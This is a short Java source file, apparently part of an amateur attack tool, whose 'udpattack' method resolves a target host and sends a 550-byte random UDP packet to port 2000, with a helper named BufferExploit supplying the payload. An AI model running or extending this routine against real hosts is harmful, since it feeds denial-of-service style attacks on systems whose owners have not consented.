package sample;

import java.io.*;
import java.net.*;

public class UDPType {

    static int port = 2000;
    static InetAddress ip;

    public static void udpattack(String url) throws IOException {
            byte[] message = (BufferExploit.GenerateRandomString(550)).getBytes();

            String string = null;

            //get the ip of the target
            try {
                ip = InetAddress.getByName(url);
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }

            //create a datagram packet
        DatagramPacket datagramPacket = new DatagramPacket(message, message.length, ip, port);

        try {
            DatagramSocket datagramSocket = new DatagramSocket();
            datagramSocket.send(datagramPacket);
            datagramSocket.close();
            System.out.print("UDP packet sent. \n");
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }
}
